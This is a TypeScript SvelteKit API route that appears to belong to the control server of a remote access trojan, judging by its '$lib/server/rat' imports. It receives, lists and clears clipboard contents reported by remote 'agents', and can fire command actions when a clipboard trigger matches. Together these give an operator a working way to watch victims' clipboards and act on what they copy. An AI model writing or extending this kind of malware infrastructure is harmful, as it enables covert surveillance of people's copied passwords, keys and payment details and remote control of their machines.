import { json, error } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { clipboardManager } from '$lib/server/rat/clipboard';
import { executeClipboardTriggerCommandAction } from '$lib/server/rat/clipboard-trigger-actions';
import type { ClipboardEventEnvelope, ClipboardTriggerEvent } from '$lib/types/clipboard';

function describeEvent(agentId: string, event: ClipboardTriggerEvent): string {
	const parts = [`agent ${agentId}`, `trigger ${event.triggerLabel}`];
	if (event.content?.format) {
		parts.push(`format ${event.content.format}`);
	}
	return parts.join(' · ');
}

function handleAction(agentId: string, event: ClipboardTriggerEvent) {
	const actionType = event.action?.type ?? 'notify';
	switch (actionType) {
		case 'notify':
			console.info(`[clipboard] ${describeEvent(agentId, event)}`);
			break;
                case 'command': {
                        executeClipboardTriggerCommandAction(agentId, event, describeEvent(agentId, event));
                        break;
                }
		default:
			console.warn(
				`[clipboard] unsupported action ${actionType} for ${describeEvent(agentId, event)}`
			);
			break;
	}
}

export const GET: RequestHandler = ({ params }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

	const events = clipboardManager.listEvents(id);
	return json({ events });
};

export const DELETE: RequestHandler = ({ params }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

	clipboardManager.clearEvents(id);
	return json({ cleared: true });
};

export const POST: RequestHandler = async ({ params, request }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

	let envelope: ClipboardEventEnvelope;
	try {
		envelope = (await request.json()) as ClipboardEventEnvelope;
	} catch {
		throw error(400, 'Invalid clipboard event payload');
	}

	const events = clipboardManager.appendEvents(id, envelope);
	for (const event of envelope.events ?? []) {
		handleAction(id, event);
	}

	return json({ events });
};
